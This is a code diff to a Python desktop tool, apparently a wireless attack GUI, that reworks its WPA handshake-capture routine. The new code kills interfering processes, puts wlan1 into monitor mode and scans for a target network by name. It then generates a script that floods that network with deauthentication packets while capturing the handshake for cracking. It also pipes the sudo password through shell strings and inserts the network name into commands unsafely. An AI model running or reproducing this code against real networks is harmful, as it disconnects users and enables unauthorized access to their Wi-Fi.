@@ -766,53 +766,63 @@ class MaximWindow(QMainWindow):
         )
 
     def _capture_handshake(self, essid):
-        """Full handshake capture workflow: scan → find target → capture → save to MAXIMHASH."""
-        self.terminal.appendPlainText(f"\n{'═'*60}")
-        self.terminal.appendPlainText(f"  HANDSHAKE CAPTURE: {essid}")
-        self.terminal.appendPlainText(f"{'═'*60}\n")
+        """Full handshake capture workflow: scan → find target → capture → save to MAXIMHASH.
+        Always uses external adapter (wlan1). No popups."""
+        import tempfile
 
-        # Ensure adapter is selected and in monitor mode
-        if not getattr(self, '_wifi_adapter_selected', False):
-            iface, keep = self._select_wifi_adapter()
-            if iface is None:
-                self.terminal.appendPlainText("[!] WiFi operation cancelled.\n")
-                return
-            self._selected_wifi_iface = iface
-            self._keep_wifi_iface = keep
-            self._wifi_adapter_selected = True
-            mon_name = self._start_monitor_mode(iface, keep)
-            self._monitor_iface_name = mon_name
-
-        mon = getattr(self, '_monitor_iface_name', f"{self._selected_wifi_iface}mon")
-
-        # Create output directory
+        # Always use wlan1 for monitor mode
+        mon = "wlan1"
         out_dir = os.path.expanduser("~/Desktop/MAXIMHASH")
         os.makedirs(out_dir, exist_ok=True)
 
-        # Step 1: Quick scan to find the ESSID — 15 second scan
-        # Run airodump-ng directly (not through runner — it would open external terminal)
-        self.terminal.appendPlainText(f"[1/4] Scanning for '{essid}'... (15 seconds)\n")
+        self.terminal.appendPlainText(f"\n{'═'*60}")
+        self.terminal.appendPlainText(f"  HANDSHAKE CAPTURE: {essid}")
+        self.terminal.appendPlainText(f"  Interface: {mon}")
+        self.terminal.appendPlainText(f"{'═'*60}\n")
+
+        # Ensure monitor mode on wlan1
+        self.terminal.appendPlainText(f"[1/5] Enabling monitor mode on {mon}...\n")
         QApplication.processEvents()
-        scan_file = f"/tmp/maxim_scan_{essid.replace(' ', '_')}"
-        # Remove old scan files
-        subprocess.run(f"rm -f {scan_file}-* 2>/dev/null", shell=True)
-        # Run scan inline with timeout
-        scan_cmd = f"sudo timeout 15 airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 {mon}"
+
+        # Build sudo prefix
+        sudo_prefix = "sudo"
         if self.runner._sudo_password:
             pw = self.runner._escape_pw()
-            scan_cmd = scan_cmd.replace("sudo ", f"echo '{pw}' | sudo -S ")
-        try:
-            subprocess.run(scan_cmd, shell=True, capture_output=True, timeout=25)
-        except subprocess.TimeoutExpired:
-            pass  # Expected — timeout kills airodump-ng
+            sudo_prefix = f"echo '{pw}' | sudo -S"
 
-        # Step 2: Parse CSV to find BSSID and channel
+        # Kill interfering processes and start monitor mode
+        subprocess.run(f"{sudo_prefix} airmon-ng check kill 2>/dev/null",
+                      shell=True, capture_output=True, timeout=10)
+        subprocess.run(f"{sudo_prefix} airmon-ng start {mon} 2>/dev/null",
+                      shell=True, capture_output=True, timeout=10)
+        # Restart NetworkManager for wlan0
+        subprocess.run(f"{sudo_prefix} systemctl restart NetworkManager 2>/dev/null",
+                      shell=True, capture_output=True, timeout=10)
+
+        self.terminal.appendPlainText(f"[2/5] Scanning for '{essid}'... (20 seconds)\n")
+        QApplication.processEvents()
+
+        # Scan all networks for 20 seconds
+        scan_file = "/tmp/maxim_hscan"
+        subprocess.run(f"rm -f {scan_file}-* 2>/dev/null", shell=True)
+        try:
+            subprocess.run(
+                f"{sudo_prefix} timeout 20 airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 {mon} 2>/dev/null",
+                shell=True, capture_output=True, timeout=25
+            )
+        except subprocess.TimeoutExpired:
+            pass
+
+        # Parse CSV to find BSSID and channel
         bssid = None
         channel = None
         csv_file = f"{scan_file}-01.csv"
         try:
             with open(csv_file, 'r', errors='replace') as f:
-                for line in f:
+                lines = f.readlines()
+                self.terminal.appendPlainText(f"[*] Scan found {len(lines)} lines in CSV\n")
+                for line in lines:
+                    # Case-insensitive ESSID match
                     if essid.lower() in line.lower():
                         parts = line.strip().split(',')
                         if len(parts) >= 14:
@@ -821,26 +831,31 @@ class MaximWindow(QMainWindow):
                             if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', candidate_bssid):
                                 bssid = candidate_bssid
                                 channel = candidate_channel.strip()
+                                self.terminal.appendPlainText(f"[*] Match: BSSID={bssid} CH={channel}\n")
                                 break
-        except Exception:
-            pass
+        except FileNotFoundError:
+            self.terminal.appendPlainText(f"[!] Scan CSV file not created — airodump-ng may have failed.\n")
+            self.terminal.appendPlainText(f"[!] Check that {mon} is in monitor mode: iwconfig {mon}\n")
+            return
+        except Exception as e:
+            self.terminal.appendPlainText(f"[!] Error reading scan: {e}\n")
+            return
 
         # Cleanup scan files
         subprocess.run(f"rm -f {scan_file}-* 2>/dev/null", shell=True)
 
         if not bssid or not channel:
             self.terminal.appendPlainText(f"\n[!] Could not find network '{essid}'.\n")
-            self.terminal.appendPlainText(f"[!] Make sure the network is in range and broadcasting.\n")
+            self.terminal.appendPlainText(f"[!] Make sure '{essid}' is in range and broadcasting.\n")
+            self.terminal.appendPlainText(f"[!] Try: sudo airodump-ng {mon}  (to see all networks)\n")
             return
 
-        self.terminal.appendPlainText(f"[2/4] Found: BSSID={bssid}  Channel={channel}\n")
+        self.terminal.appendPlainText(f"\n[3/5] Found: BSSID={bssid}  Channel={channel}\n")
 
-        # Step 3: Capture handshake + deauth in external terminal
-        # Write a script that captures and deauths simultaneously
-        safe_essid = essid.replace(' ', '_').replace("'", "")
+        # Write capture + deauth script
+        safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
         capture_prefix = f"{out_dir}/{safe_essid}"
 
-        import tempfile
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write(f"echo ''\n")
@@ -850,35 +865,31 @@ class MaximWindow(QMainWindow):
         script.write(f"echo '  Output: {out_dir}/'\n")
         script.write(f"echo '══════════════════════════════════════════'\n")
         script.write(f"echo ''\n")
-        script.write(f"echo '[*] Starting capture on channel {channel}...'\n")
-        script.write(f"echo '[*] Sending deauth packets in background...'\n")
-        script.write(f"echo '[*] Wait for WPA handshake message, then press Ctrl+C'\n")
+        script.write(f"echo '[*] Starting capture + deauth...'\n")
+        script.write(f"echo '[*] Wait for WPA handshake message, then Ctrl+C'\n")
         script.write(f"echo ''\n\n")
-        # Start deauth in background (send 5 rounds of 10 deauths, with pauses)
+        # Deauth in background
         script.write(f"(\n")
         script.write(f"  sleep 5\n")
-        script.write(f"  for i in 1 2 3 4 5; do\n")
+        script.write(f"  for i in 1 2 3 4 5 6 7 8 9 10; do\n")
         script.write(f"    sudo aireplay-ng --deauth 10 -a {bssid} {mon} 2>/dev/null\n")
-        script.write(f"    sleep 10\n")
+        script.write(f"    sleep 8\n")
         script.write(f"  done\n")
         script.write(f") &\n")
         script.write(f"DEAUTH_PID=$!\n\n")
-        # Capture — airodump-ng will show "WPA handshake: XX:XX..." when captured
+        # Capture
         script.write(f"sudo airodump-ng -c {channel} --bssid {bssid} -w '{capture_prefix}' {mon}\n\n")
-        # Cleanup deauth process
         script.write(f"kill $DEAUTH_PID 2>/dev/null\n")
         script.write(f"echo ''\n")
-        script.write(f"echo '[*] Capture files saved to {out_dir}/'\n")
+        script.write(f"echo 'Capture files:'\n")
         script.write(f"ls -la {capture_prefix}* 2>/dev/null\n")
         script.write(f"echo ''\necho 'Press Enter to close'\nread\n")
         script.close()
         os.chmod(script.name, 0o755)
 
-        self.terminal.appendPlainText(f"[3/4] Opening capture terminal (deauth + airodump-ng)...\n")
-        self.terminal.appendPlainText(f"[*] Wait for 'WPA handshake: {bssid}' then press Ctrl+C\n")
-        self.terminal.appendPlainText(f"[4/4] Capture files → {out_dir}/\n\n")
+        self.terminal.appendPlainText(f"[4/5] Opening capture terminal...\n")
+        self.terminal.appendPlainText(f"[5/5] Capture files → {out_dir}/\n\n")
 
-        # Open in external terminal
         self.runner.run_in_terminal(f"bash '{script.name}'")
 
     # ═══════════════════════════════════════
